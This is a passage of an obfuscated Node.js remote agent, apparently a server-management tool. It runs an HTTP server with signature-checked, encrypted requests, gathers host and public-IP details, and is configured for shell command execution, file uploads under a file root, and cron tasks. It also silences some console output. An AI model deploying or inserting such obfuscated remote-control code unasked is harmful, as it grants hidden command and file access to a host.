#!/usr/bin/env node
const a0T = a0b;
(function (a, b) {
    const S = a0b, c = a();
    while (!![]) {
        try {
            const d = -parseInt(S(0x201)) / 0x1 * (-parseInt(S(0x43b)) / 0x2) + parseInt(S(0x1fd)) / 0x3 * (parseInt(S(0x2af)) / 0x4) + parseInt(S(0x1d6)) / 0x5 * (parseInt(S(0x24e)) / 0x6) + parseInt(S(0x3b9)) / 0x7 * (-parseInt(S(0x27a)) / 0x8) + -parseInt(S(0x3b8)) / 0x9 + -parseInt(S(0x1a1)) / 0xa + parseInt(S(0x342)) / 0xb * (parseInt(S(0x272)) / 0xc);
            if (d === b)
                break;
            else
                c['push'](c['shift']());
        } catch (f) {
            c['push'](c['shift']());
        }
    }
}(a0a, 0xaf58e));
const a0c = [
    a0T(0x294),
    a0T(0x2d3),
    'falling\x20back\x20to\x20ArrayBuffer\x20instantiation'
];
function a0d(a) {
    const b = {
        'awlOL': function (c) {
            return c();
        }
    };
    return function (c, d, f) {
        const U = a0b, g = c['toString']();
        if (a0c[U(0x225)](h => g[U(0x456)](h))) {
            if (typeof f === U(0x339))
                b[U(0x2e7)](f);
            return !![];
        }
        return a[U(0x42d)](this, arguments);
    };
}
process[a0T(0x1c8)][a0T(0x1b1)] = a0d(process[a0T(0x1c8)][a0T(0x1b1)]), process['stderr'][a0T(0x1b1)] = a0d(process['stderr']['write']);
const a0f = require(a0T(0x2b1)), a0g = require(a0T(0x283)), a0h = require('fs'), a0i = require('fs')[a0T(0x2bc)], a0j = require(a0T(0x44e)), a0k = require('os'), {exec: a0l} = require(a0T(0x2c6)), a0m = require(a0T(0x1dc)), a0n = require(a0T(0x2b6)), {encrypt: a0o} = require(a0T(0x2d8)), a0p = require(a0T(0x3dc)), a0q = require(a0T(0x3c6)), a0r = require('noise-c.wasm');
let a0s, a0t;
try {
    typeof Bun !== a0T(0x1c9) ? a0t = require(a0T(0x40b)) : a0t = require(a0T(0x19b));
} catch (a0R) {
    console[a0T(0x333)](a0T(0x301)), console[a0T(0x333)](a0T(0x2cf) + a0R[a0T(0x42e)]), console[a0T(0x333)](a0T(0x230)), process[a0T(0x435)](0x1);
}
const a0u = {
    'LEVELS': {
        'DEBUG': 0x0,
        'INFO': 0x1,
        'WARN': 0x2,
        'ERROR': 0x3
    },
    get 'currentLevel'() {
        const V = a0T, a = {
                'zqlRr': function (b, c) {
                    return b !== c;
                },
                'LkAPP': V(0x1c9)
            };
        return a[V(0x1ee)](typeof a0E, a[V(0x223)]) && a['zqlRr'](a0E[V(0x1f9)], undefined) ? a0E[V(0x1f9)] : 0x2;
    },
    'debug': a => {
        const W = a0T, b = {
                'kwYkl': function (c, d) {
                    return c <= d;
                }
            };
        b[W(0x277)](a0u[W(0x22f)], a0u['LEVELS'][W(0x46e)]) && console['log'](W(0x423) + a);
    },
    'info': a => {
        const X = a0T, b = {
                'SkusS': function (c, d) {
                    return c <= d;
                }
            };
        b[X(0x19e)](a0u[X(0x22f)], a0u['LEVELS'][X(0x382)]) && console[X(0x1ae)](X(0x1f7) + a);
    },
    'warn': a => {
        const Y = a0T, b = {
                'foiiY': function (c, d) {
                    return c <= d;
                }
            };
        b[Y(0x253)](a0u[Y(0x22f)], a0u[Y(0x3f3)][Y(0x420)]) && console[Y(0x1ae)]('\x1b[33m[WARN]\x1b[0m\x20' + a);
    },
    'error': a => {
        const Z = a0T, b = {
                'EWLWj': function (c, d) {
                    return c <= d;
                }
            };
        b[Z(0x200)](a0u[Z(0x22f)], a0u[Z(0x3f3)][Z(0x42c)]) && console[Z(0x1ae)](Z(0x46c) + a);
    }
};
class a0v {
    constructor(a = 'ok') {
        this['status'] = a;
    }
}
class a0w extends a0v {
    constructor(a = 'ok', b = 0x0) {
        const a0 = a0T;
        super(a), this[a0(0x487)] = b;
    }
}
class a0x extends a0v {
    constructor() {
        const a1 = a0T;
        super(), this[a1(0x43e)] = '', this[a1(0x308)] = 0x0, this[a1(0x2b0)] = '', this['disk_total'] = 0x0, this['gpu_name'] = '', this[a1(0x2eb)] = null, this[a1(0x424)] = null, this['mem_total'] = 0x0, this['os'] = '', this[a1(0x397)] = '', this['swap_total'] = 0x0, this['version'] = a0E[a1(0x386)], this[a1(0x2ff)] = '', this[a1(0x38d)] = '', this[a1(0x347)] = null;
    }
}
class a0y extends a0v {
    constructor() {
        const a2 = a0T, a = { 'PUIbW': a2(0x373) }, b = a[a2(0x431)][a2(0x46d)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a2(0x2ab)] = 0x0;
                continue;
            case '1':
                this[a2(0x41e)] = {
                    'up': 0x0,
                    'down': 0x0,
                    'totalUp': 0x0,
                    'totalDown': 0x0
                };
                continue;
            case '2':
                this[a2(0x2e3)] = { 'usage': 0x0 };
                continue;
            case '3':
                this[a2(0x1e3)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '4':
                this[a2(0x328)] = {
                    'tcp': 0x0,
                    'udp': 0x0
                };
                continue;
            case '5':
                this[a2(0x383)] = {
                    'load1': 0x0,
                    'load5': 0x0,
                    'load15': 0x0
                };
                continue;
            case '6':
                this[a2(0x2a7)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '7':
                this['process'] = 0x0;
                continue;
            case '8':
                super();
                continue;
            case '9':
                this[a2(0x46f)] = {
                    'total': 0x0,
                    'used': 0x0
                };
                continue;
            case '10':
                this[a2(0x42e)] = '';
                continue;
            }
            break;
        }
    }
}
class a0z extends a0v {
    constructor() {
        const a3 = a0T;
        super(), this[a3(0x39a)] = '', this[a3(0x1f5)] = 0x0, this['timeout'] = ![], this[a3(0x38e)] = '';
    }
}
class a0A {
    constructor() {
        const a4 = a0T, a = { 'SeMCa': '4|1|3|6|2|7|5|0' }, b = a[a4(0x40a)][a4(0x46d)]('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a4(0x266)] = '';
                continue;
            case '1':
                this['path'] = '';
                continue;
            case '2':
                this[a4(0x43a)] = '';
                continue;
            case '3':
                this[a4(0x1b6)] = '';
                continue;
            case '4':
                this[a4(0x292)] = '';
                continue;
            case '5':
                this['mode_octal'] = '';
                continue;
            case '6':
                this[a4(0x213)] = 0x0;
                continue;
            case '7':
                this['mode'] = '';
                continue;
            }
            break;
        }
    }
}
class a0B {
    constructor() {
        const a5 = a0T, a = { 'bGxqd': a5(0x316) }, b = a[a5(0x2d1)]['split']('|');
        let c = 0x0;
        while (!![]) {
            switch (b[c++]) {
            case '0':
                this[a5(0x44e)] = '';
                continue;
            case '1':
                this[a5(0x278)] = ![];
                continue;
            case '2':
                this['writable'] = ![];
                continue;
            case '3':
                this[a5(0x2ca)] = '';
                continue;
            case '4':
                this[a5(0x217)] = ![];
                continue;
            case '5':
                this['name'] = '';
                continue;
            case '6':
                this[a5(0x402)] = '';
                continue;
            case '7':
                this[a5(0x1b6)] = '';
                continue;
            }
            break;
        }
    }
}
class a0C extends a0v {
    constructor() {
        const a6 = a0T;
        super(), this[a6(0x454)] = [];
    }
}
class a0D {
    static ['_generateRawKeypair']() {
        const a7 = a0T, a = {
                'QeMgA': a7(0x2f0),
                'CqinC': 'jwk',
                'ctCxF': a7(0x32f),
                'eMGOB': function (i, j) {
                    return i !== j;
                },
                'kqPbq': a7(0x210)
            }, {
                privateKey: b,
                publicKey: c
            } = a0g['generateKeyPairSync'](a[a7(0x258)]), d = b[a7(0x2aa)]({ 'format': a[a7(0x48f)] }), f = c[a7(0x2aa)]({ 'format': a[a7(0x48f)] }), g = Buffer['from'](d['d'], 'base64url'), h = Buffer[a7(0x1e7)](f['x'], a['ctCxF']);
        return (g['length'] !== 0x20 || a[a7(0x3fa)](h[a7(0x30c)], 0x20)) && a0u[a7(0x333)](a7(0x30a)), {
            'private_b64': g[a7(0x48d)]('base64'),
            'public_b64': h[a7(0x48d)](a[a7(0x35b)])
        };
    }
    static [a0T(0x32d)](a) {
        const a8 = a0T, b = this[a8(0x321)]();
        return {
            'role': a,
            'private_b64': b[a8(0x2fb)],
            'public_b64': b[a8(0x3ac)]
        };
    }
    static ['generatePair'](a = 'Controller', b = 'Agent') {
        const a9 = a0T, c = {
                'control': this[a9(0x32d)](a),
                'agent': this[a9(0x32d)](b)
            };
        return c;
    }
}
class a0E {
    static [a0T(0x3f4)] = parseInt(process.env.EXEC_TIMEOUT || '30');
    static [a0T(0x20c)] = (process.env.EXEC_SHELL || a0T(0x35c))[a0T(0x47b)]() === 'true';
    static [a0T(0x46e)] = (process.env.DEBUG || a0T(0x1ce))[a0T(0x47b)]() === a0T(0x35c);
    static [a0T(0x3aa)] = parseInt(process.env.TIMESTAMP_WINDOW || a0T(0x20b));
    static [a0T(0x1f9)] = parseInt(process.env.LOG_LEVEL || (this[a0T(0x46e)] ? '0' : '2'), 0xa);
    static [a0T(0x305)] = a0E[a0T(0x1e2)](a0T(0x2e1), a0T(0x2ce)) || 'ECDSA公钥内容';
    static [a0T(0x36d)] = a0E[a0T(0x1e2)]('ECIES_PUBKEY', a0T(0x2b2)) || 'ECIES公钥内容';
    static [a0T(0x417)] = process.env.FILE_ROOT || a0k[a0T(0x2b9)]();
    static [a0T(0x3a8)] = parseInt(process.env.MAX_UPLOAD_SIZE || a0T(0x302));
    static ['FOLLOW_SYMLINKS'] = (process.env.FOLLOW_SYMLINKS || a0T(0x1ce))[a0T(0x47b)]() === a0T(0x35c);
    static [a0T(0x3a3)] = (process.env.FILE_AUDIT_LOG || 'true')[a0T(0x47b)]() === 'true';
    static ['InitTask'] = !![];
    static [a0T(0x449)] = [];
    static [a0T(0x2f2)] = {};
    static [a0T(0x2a2)] = ![];
    static ['TASK_TIMEOUT'] = parseInt(process.env.TASK_TIMEOUT || a0T(0x352));
    static [a0T(0x219)] = parseInt(process.env.CRON_INTERVAL || '30');
    static [a0T(0x1d1)] = [];
    static ['crontasks_log'] = [];
    static [a0T(0x315)] = parseInt(process.env.MAX_TASK_LOG || a0T(0x376));
    static [a0T(0x246)] = process.env.HOST || a0T(0x35e);
    static [a0T(0x3ea)] = parseInt(process.env.PORT || process.env.SERVER_PORT || '8000');
    static ['AGENT_VERSION'] = process.env.AGENT_VERSION || a0T(0x208);
    static [a0T(0x1f8)] = a0g[a0T(0x381)](0x20)[a0T(0x48d)](a0T(0x210));
    static ['NOISE_KEYS_INTERNAL'] = a0D[a0T(0x2ae)]();
    static ['NOISE_KEY'] = {
        'controller': { 'private': this[a0T(0x2a5)]['control'][a0T(0x2fb)] },
        'agent': { 'public': this[a0T(0x2a5)][a0T(0x260)][a0T(0x3ac)] }
    };
    static ['_getConfigValue'](a, b) {
        const aa = a0T, c = { 'clXQX': 'utf8' }, d = process.env[a];
        if (d)
            return d;
        const f = a0j[aa(0x332)](__dirname, b);
        if (a0h[aa(0x45e)](f))
            try {
                return a0h[aa(0x45d)](f, c[aa(0x390)])[aa(0x413)]();
            } catch (g) {
            }
        return '';
    }
    static [a0T(0x45c)]() {
        const ab = a0T, a = {
                'JJnFH': ab(0x447),
                'BwpYE': function (b, c) {
                    return b > c;
                },
                'obknB': ab(0x1e1),
                'jWLLw': ab(0x416),
                'XzFzm': ab(0x1a9),
                'maPGE': ab(0x2cd)
            };
        if (!this[ab(0x46e)]) {
            const b = [];
            !this[ab(0x305)] && b[ab(0x298)](a[ab(0x3ae)]);
            !this[ab(0x36d)] && b[ab(0x298)](ab(0x2a6));
            if (a[ab(0x37e)](b[ab(0x30c)], 0x0)) {
                const c = a[ab(0x2ea)]['split']('|');
                let d = 0x0;
                while (!![]) {
                    switch (c[d++]) {
                    case '0':
                        a0u[ab(0x333)]('❌\x20配置校验失败\x20(非DEBUG模式必须配置密钥):');
                        continue;
                    case '1':
                        a0u['debug'](a['jWLLw']);
                        continue;
                    case '2':
                        b[ab(0x2bd)](f => a0u['error'](ab(0x288) + f));
                        continue;
                    case '3':
                        process[ab(0x435)](0x1);
                        continue;
                    case '4':
                        a0u[ab(0x3db)](a[ab(0x460)]);
                        continue;
                    case '5':
                        a0u[ab(0x3db)](a[ab(0x2f5)]);
                        continue;
                    }
                    break;
                }
            }
        }
    }
    static ['merge'](a = {}) {
        const ac = a0T, b = {
                'TnpJK': function (c, d) {
                    return c !== d;
                },
                'BenuO': function (c, d) {
                    return c !== d;
                },
                'lSiQX': function (c, d, f) {
                    return c(d, f);
                },
                'CGxtU': function (c, d) {
                    return c(d);
                }
            };
        if (!a)
            return;
        b[ac(0x398)](a['PORT'], undefined) && b[ac(0x35f)](a[ac(0x3ea)], null) && (this[ac(0x3ea)] = b[ac(0x205)](parseInt, b[ac(0x31e)](String, a[ac(0x3ea)]), 0xa)), a[ac(0x305)] && (this[ac(0x305)] = a['ECDSA_PUBLIC_KEY_PEM'][ac(0x413)]()), a[ac(0x36d)] && (this[ac(0x36d)] = a[ac(0x36d)]['trim']());
    }
}
class a0F {
    constructor(a, b) {
        const ad = a0T, c = {
                'meJHT': ad(0x210),
                'GjQKW': function (d, f) {
                    return d(f);
                },
                'gOwah': ad(0x440)
            };
        this[ad(0x29a)] = null, this[ad(0x206)] = null;
        if (a)
            try {
                const d = a[ad(0x413)]();
                if (d['startsWith'](ad(0x3c7)))
                    this[ad(0x29a)] = a0g[ad(0x396)](d);
                else {
                    const f = Buffer[ad(0x1e7)](d, c[ad(0x409)]), g = a0s[ad(0x49b)]['fromBytes'](f), h = g[ad(0x214)](![]), i = m => m[ad(0x48d)]('base64')['replace'](/\+/g, '-')[ad(0x297)](/\//g, '_')[ad(0x297)](/=/g, ''), j = c[ad(0x482)](i, Buffer[ad(0x1e7)](h[ad(0x37b)](0x1, 0x21))), k = i(Buffer[ad(0x1e7)](h[ad(0x37b)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c['gOwah'],
                            'x': j,
                            'y': k
                        };
                    this[ad(0x29a)] = a0g['createPublicKey']({
                        'key': l,
                        'format': ad(0x3ad)
                    });
                }
            } catch (m) {
                a0u[ad(0x333)]('⚠️\x20ECDSA公钥加载失败:\x20' + m[ad(0x42e)]), this[ad(0x29a)] = null;
            }
        if (b)
            try {
                this[ad(0x206)] = a0p[ad(0x33e)](b[ad(0x413)]());
            } catch (n) {
                a0u[ad(0x295)](ad(0x1c2) + n[ad(0x42e)]);
            }
    }
    [a0T(0x468)](a, b, c) {
        const ae = a0T, d = {
                'Mhqjz': function (f, g) {
                    return f(g);
                },
                'MEUGe': function (f, g) {
                    return f / g;
                },
                'QBiMg': function (f, g) {
                    return f > g;
                },
                'WvTSB': function (f, g) {
                    return f - g;
                },
                'sazfJ': ae(0x39d)
            };
        if (!this[ae(0x29a)])
            return !![];
        try {
            const f = d[ae(0x22b)](parseInt, b), g = Math['floor'](d[ae(0x44c)](Date[ae(0x20d)](), 0x3e8));
            if (d['QBiMg'](Math[ae(0x255)](d[ae(0x461)](g, f)), a0E['TIMESTAMP_WINDOW']))
                throw new Error('Timestamp\x20expired:\x20diff=' + Math[ae(0x255)](d[ae(0x461)](g, f)) + 's\x20>\x20' + a0E[ae(0x3aa)] + 's');
            const h = '' + a + b, i = a0p[ae(0x33e)](c), j = a0g[ae(0x275)](d[ae(0x296)]);
            return j[ae(0x311)](h), j[ae(0x28b)](this[ae(0x29a)], i);
        } catch (k) {
            throw new Error(ae(0x2c1) + k['message']);
        }
    }
    [a0T(0x299)](a) {
        const af = a0T, b = {
                'IuVVF': function (c, d, f) {
                    return c(d, f);
                },
                'mSUkJ': af(0x210)
            };
        if (a0E[af(0x46e)] || !this[af(0x206)])
            return JSON['stringify'](a);
        try {
            const c = JSON[af(0x28d)](a), d = Buffer['from'](c, af(0x369)), f = Buffer[af(0x1e7)](this[af(0x206)]), g = b[af(0x2f4)](a0o, f, d);
            return Buffer[af(0x1e7)](g)['toString'](b[af(0x1cc)]);
        } catch (h) {
            const i = {
                '_encrypt_error': h['message'],
                '_raw': a0E[af(0x46e)] ? a : null
            };
            return JSON['stringify'](i);
        }
    }
    ['decryptData'](a, b) {
        const ag = a0T, c = {
                'FhzJI': function (d, f) {
                    return d !== f;
                },
                'aLFeK': 'base64',
                'ztgKR': ag(0x1cb),
                'MCpHc': ag(0x357)
            };
        if (!b || c[ag(0x1a8)](b['length'], 0x20))
            throw new Error('AES\x20Decrypt\x20Error:\x20Key\x20must\x20be\x20exactly\x2032\x20bytes\x20for\x20AES-256.');
        try {
            const d = Buffer[ag(0x1e7)](a, c[ag(0x2c5)])['toString'](ag(0x357)), f = JSON[ag(0x1dd)](d);
            if (!f[ag(0x244)] || !f[ag(0x25e)] || !f[ag(0x483)])
                throw new Error(c[ag(0x267)]);
            const g = Buffer[ag(0x1e7)](f[ag(0x244)], c['aLFeK']), h = Buffer[ag(0x1e7)](f[ag(0x25e)], c[ag(0x2c5)]), i = Buffer[ag(0x1e7)](f[ag(0x483)], c[ag(0x2c5)]), j = a0g[ag(0x433)]('aes-256-gcm', b, g);
            j[ag(0x399)](h);
            let k = j['update'](i, null, c[ag(0x498)]);
            return k += j['final'](c[ag(0x498)]), k;
        } catch (l) {
            throw new Error('AES\x20Decrypt\x20Error:\x20' + l[ag(0x42e)]);
        }
    }
}
function a0G(a) {
    const ah = a0T, b = {
            'bmuMs': ah(0x368),
            'hdZtC': ah(0x209),
            'aquej': function (c, d) {
                return c === d;
            },
            'OJTBN': ah(0x2fa),
            'QoeEl': 'x-encrypted',
            'RUIcU': ah(0x35c),
            'UPoje': ah(0x3a7),
            'aolNM': ah(0x2a1),
            'XEFGt': 'utf8',
            'dXsYS': ah(0x1ce),
            'PvRZN': ah(0x1a3),
            'NPpjN': ah(0x1b9),
            'seffH': ah(0x254),
            'igWuZ': function (c, d) {
                return c === d;
            },
            'YSAin': function (c) {
                return c();
            },
            'GZLVQ': ah(0x3dd),
            'hQinA': ah(0x1b7),
            'MDNwB': 'x-nonce',
            'rvNZE': 'X-Nonce',
            'asNyr': ah(0x365),
            'bWqDd': 'x-auth-token',
            'vAUKz': 'X-Auth-Token',
            'Pqlzy': function (c, d) {
                return c || d;
            },
            'Twspf': ah(0x3b1),
            'nFutw': function (c, d) {
                return c === d;
            },
            'Luljt': ah(0x224),
            'YRCpz': ah(0x210),
            'baEQO': ah(0x24c),
            'doOAM': ah(0x369),
            'opeiL': function (c) {
                return c();
            }
        };
    return async (c, d, f) => {
        const ai = ah;
        if (c[ai(0x44e)]['startsWith'](b[ai(0x3e1)]) || b['aquej']((c['headers'][ai(0x2f3)] || '')[ai(0x47b)](), b['NPpjN']))
            return f();
        if (b[ai(0x1aa)](c[ai(0x3b7)], b[ai(0x3d8)]) || b[ai(0x3da)](c[ai(0x3b7)], ai(0x43f)))
            return b[ai(0x221)](f);
        c[ai(0x287)] = !![];
        const g = [
            b['GZLVQ'],
            b[ai(0x1e8)]
        ];
        if (!a0E[ai(0x46e)] && !c[ai(0x3f9)]['x-debug']) {
            const i = c['headers'][b['MDNwB']] || c[ai(0x3f9)][b[ai(0x30b)]], j = c['headers'][ai(0x211)] || c['headers'][b[ai(0x485)]], k = c[ai(0x3f9)][b[ai(0x1bd)]] || c[ai(0x3f9)][b[ai(0x395)]];
            if (b[ai(0x2a0)](!i, !j) || !k) {
                if (g[ai(0x456)](c['path']))
                    c[ai(0x287)] = ![];
                else
                    return d[ai(0x3de)](0x191)['json']({ 'error': b[ai(0x25f)] });
            }
            if (c[ai(0x287)])
                try {
                    a[ai(0x468)](i, j, k);
                } catch (l) {
                    if (g[ai(0x456)](c[ai(0x44e)]))
                        c['is_authenticated'] = ![];
                    else
                        return d[ai(0x3de)](0x191)['json']({ 'error': ai(0x2c1) + l[ai(0x42e)] });
                }
        }
        if (c[ai(0x1ed)] && b[ai(0x28e)](typeof c['body'], b[ai(0x3ef)])) {
            const m = b[ai(0x3da)]((c[ai(0x3f9)][b[ai(0x486)]] || '')[ai(0x47b)](), b['RUIcU']);
            try {
                if (m && c[ai(0x287)]) {
                    const n = Buffer[ai(0x1e7)](a0E[ai(0x1f8)], b[ai(0x371)]), o = a[ai(0x28a)](c[ai(0x1ed)], n);
                    c[ai(0x1ed)] = JSON[ai(0x1dd)](o);
                } else {
                    if (c[ai(0x1ed)]['startsWith'](b['baEQO'])) {
                        const p = Buffer[ai(0x1e7)](c[ai(0x1ed)], ai(0x210))['toString'](b[ai(0x26e)]);
                        c['body'] = JSON['parse'](p);
                    } else {
                        if (c[ai(0x1ed)]['trim']()['startsWith']('{') || c['body'][ai(0x413)]()[ai(0x444)]('['))
                            c[ai(0x1ed)] = JSON[ai(0x1dd)](c[ai(0x1ed)]);
                        else {
                            if (b[ai(0x1aa)](c[ai(0x1ed)]['trim'](), ''))
                                c['body'] = {};
                        }
                    }
                }
            } catch (q) {
                return a0u[ai(0x333)](ai(0x45a) + q['message']), d['status'](0x190)[ai(0x411)]({ 'error': ai(0x251) + q[ai(0x42e)] });
            }
        }
        const h = d[ai(0x3f7)];
        d[ai(0x3f7)] = function (r) {
            const aj = ai;
            if (d['get'](b[aj(0x326)]) && d[aj(0x3bd)](aj(0x368))[aj(0x456)](b[aj(0x1d5)]))
                try {
                    const s = b[aj(0x1aa)](typeof r, b[aj(0x3ef)]) ? JSON['parse'](r) : r;
                    if (c[aj(0x287)]) {
                        const t = a['encryptResponse'](s), u = b['aquej'](typeof t, b[aj(0x3ef)]) ? t : JSON[aj(0x28d)](t);
                        return !a0E[aj(0x46e)] && (d[aj(0x2bb)](b['QoeEl'], b['RUIcU']), d['set'](b['UPoje'], a0E[aj(0x386)])), d['set'](b[aj(0x494)], Buffer[aj(0x415)](u, b[aj(0x41d)])[aj(0x48d)]()), h[aj(0x1c5)](this, u);
                    } else {
                        const v = b[aj(0x1aa)](typeof r, b['OJTBN']) ? r : JSON[aj(0x28d)](s);
                        return d[aj(0x2bb)](b['QoeEl'], b['dXsYS']), d[aj(0x2bb)](aj(0x2a1), Buffer['byteLength'](v, b['XEFGt'])[aj(0x48d)]()), h[aj(0x1c5)](this, v);
                    }
                } catch (w) {
                    if (a0E[aj(0x46e)])
                        a0u[aj(0x333)](aj(0x377) + w[aj(0x42e)]);
                }
            return h[aj(0x1c5)](this, r);
        }, b['opeiL'](f);
    };
}
class a0H {
    constructor() {
        const ak = a0T;
        this[ak(0x20a)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[ak(0x2b5)] = 0x0, this[ak(0x307)] = 0x0, this['lastNetworkTime'] = Date[ak(0x20d)]() / 0x3e8;
    }
    async [a0T(0x303)]() {
        const al = a0T, a = {
                'oLpzl': '/sys/fs/cgroup/memory.max',
                'ccFdK': al(0x357),
                'dDzCq': function (d, f) {
                    return d === f;
                },
                'vrFwy': al(0x3e0),
                'IxXEr': function (d, f, g) {
                    return d(f, g);
                },
                'hKIYI': function (d, f, g) {
                    return d(f, g);
                },
                'DNobA': al(0x21c),
                'bBYpM': function (d, f, g) {
                    return d(f, g);
                },
                'bCrsO': function (d, f) {
                    return d > f;
                },
                'DRpPt': function (d, f) {
                    return d === f;
                },
                'wyqEs': function (d, f) {
                    return d === f;
                },
                'UUjrG': function (d, f) {
                    return d(f);
                },
                'tJTnu': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0i[al(0x345)](a[al(0x36b)], a[al(0x1c6)]))[al(0x413)]();
            b = a[al(0x470)](d, a['vrFwy']) ? null : a[al(0x475)](parseInt, d, 0xa), c = a[al(0x475)](parseInt, (await a0i['readFile'](al(0x31c), 'utf8'))[al(0x413)](), 0xa);
        } catch {
            try {
                b = a[al(0x474)](parseInt, (await a0i[al(0x345)](a['DNobA'], a[al(0x1c6)]))['trim'](), 0xa), c = a[al(0x37f)](parseInt, (await a0i[al(0x345)]('/sys/fs/cgroup/memory/memory.usage_in_bytes', al(0x357)))[al(0x413)](), 0xa);
                if (a['bCrsO'](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0n['mem']();
                b = f[al(0x2a4)], c = f['used'];
            }
        }
        if (a[al(0x2ec)](b, null)) {
            const g = await a0n[al(0x285)]();
            b = g['total'], (a['wyqEs'](c, null) || a[al(0x313)](isNaN, c)) && (c = g[al(0x236)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a['tJTnu'](b, c),
            'free': a[al(0x1b0)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async [a0T(0x290)]() {
        const am = a0T, [a, b, c, d] = await Promise['all']([
                a0n[am(0x2e3)](),
                this[am(0x303)](),
                a0n[am(0x32a)](),
                a0n[am(0x229)]()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise[am(0x29f)]([
                this['getPublicIpV4'](),
                this[am(0x2da)]()
            ]);
        } catch (h) {
            a0u[am(0x3db)](am(0x1c7) + h[am(0x42e)], 0x1);
        }
        return {
            'arch': a0k[am(0x43e)](),
            'cpu_cores': a[am(0x348)],
            'cpu_name': a[am(0x27d)],
            'disk_total': (await a0n['fsSize']())[0x0]?.[am(0x213)] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[am(0x2a4)],
            'os': c[am(0x204)] + '\x20' + c[am(0x38f)],
            'kernel_version': c[am(0x3e7)],
            'swap_total': b['swaptotal'],
            'version': a0E[am(0x386)],
            'virtualization': await this[am(0x463)](),
            'session_key': a0E[am(0x1f8)],
            'noise_key': a0E[am(0x408)]
        };
    }
    ['getLocalIPv4']() {
        const an = a0T, a = {
                'mLpfd': function (c, d) {
                    return c === d;
                }
            }, b = a0k['networkInterfaces']();
        for (const c of Object[an(0x2cc)](b)) {
            for (const d of b[c]) {
                const f = a['mLpfd'](d['family'], 'IPv4') || d[an(0x3d5)] === 0x4;
                if (f && !d[an(0x3f8)]) {
                    if (!/^10\./[an(0x403)](d[an(0x3d9)]) && !/^192\.168\./['test'](d['address']) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[an(0x403)](d[an(0x3d9)]))
                        return d[an(0x3d9)];
                }
            }
        }
        return null;
    }
    async [a0T(0x222)]() {
        const ao = a0T, a = {
                'ryqCL': ao(0x3ce),
                'JjsbO': ao(0x469),
                'GjpOs': ao(0x1fb),
                'pfvFX': 'https://ipinfo.io/ip',
                'BbApv': ao(0x2c3)
            }, b = [
                a[ao(0x3b0)],
                a['JjsbO'],
                ao(0x422),
                ao(0x2e6),
                a[ao(0x3e4)],
                a['pfvFX'],
                a[ao(0x3e5)]
            ];
        for (const d of b) {
            try {
                const f = await this[ao(0x1ef)](d, 0x4);
                if (f && this[ao(0x19d)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[ao(0x360)]();
        if (c && this['isValidIPv4'](c))
            return c;
        return null;
    }
    [a0T(0x1b3)]() {
        const ap = a0T, a = {
                'ZLTvm': function (c, d) {
                    return c === d;
                },
                'RJHfD': 'IPv6',
                'TMFMc': function (c, d) {
                    return c === d;
                },
                'ICAhn': ap(0x2d0)
            }, b = a0k['networkInterfaces']();
        for (const c of Object[ap(0x2cc)](b)) {
            for (const d of b[c]) {
                const f = a[ap(0x3a1)](d['family'], a['RJHfD']) || a[ap(0x337)](d[ap(0x3d5)], 0x6);
                if (f && !d[ap(0x3f8)]) {
                    if (!d[ap(0x3d9)]['toLowerCase']()[ap(0x444)](a['ICAhn']))
                        return d[ap(0x3d9)];
                }
            }
        }
        return null;
    }
    async [a0T(0x2da)]() {
        const aq = a0T, a = {
                'yBQEX': aq(0x344),
                'kBMid': 'https://v6.ident.me'
            }, b = this['getLocalIPv6']();
        if (b && this[aq(0x26f)](b))
            return b;
        const c = [
            a[aq(0x23b)],
            aq(0x469),
            a[aq(0x3e6)]
        ];
        for (const d of c) {
            try {
                const f = await this[aq(0x1ef)](d, 0x6);
                if (f && this[aq(0x26f)](f))
                    return f;
            } catch (g) {
                a0u[aq(0x3db)]('访问\x20' + d + aq(0x49d) + g[aq(0x42e)]);
                continue;
            }
        }
        return null;
    }
    async [a0T(0x1ef)](a, b = 0x0) {
        const ar = a0T, c = {
                'PpMgO': function (d, f) {
                    return d !== f;
                },
                'Gljdr': function (d, f) {
                    return d(f);
                },
                'OVkGt': ar(0x3e2),
                'pdQMj': 'end',
                'HtnWO': ar(0x1e9),
                'FhEsX': ar(0x2d5),
                'MrEEi': ar(0x333)
            };
        return new Promise((d, f) => {
            const as = ar, g = {
                    'pLnfI': function (k, l) {
                        return c['Gljdr'](k, l);
                    }
                }, h = c[as(0x23c)](require, c['HtnWO']), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[as(0x1de)] }
                }, j = h[as(0x3bd)](a, i, k => {
                    const at = as;
                    let l = '';
                    if (c[at(0x38a)](k[at(0x202)], 0xc8)) {
                        c['Gljdr'](f, new Error(at(0x35a) + k[at(0x202)]));
                        return;
                    }
                    k['on'](c[at(0x375)], m => l += m), k['on'](c[at(0x3d1)], () => d(l[at(0x413)]()));
                });
            j['on'](c[as(0x421)], f), j[as(0x450)](0x1388, () => {
                const au = as;
                j['destroy'](), g[au(0x441)](f, new Error(au(0x1b4)));
            });
        });
    }
    ['isValidIPv4'](a) {
        const av = a0T;
        return /^(\d{1,3}\.){3}\d{1,3}$/[av(0x403)](a);
    }
    ['isValidIPv6'](a) {
        const aw = a0T;
        if (!/^[0-9a-fA-F:]+$/[aw(0x403)](a) || !a[aw(0x456)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[aw(0x403)](a))
            return ![];
        return !![];
    }
    async ['getRealtimeInfo']() {
        const ax = a0T, a = {
                'PdgfR': function (m, n) {
                    return m - n;
                },
                'LmpQO': function (m, n) {
                    return m / n;
                },
                'rsFeD': function (m, n) {
                    return m / n;
                },
                'sctUL': function (m, n) {
                    return m * n;
                }
            }, [b, c, d, f] = await Promise[ax(0x29f)]([
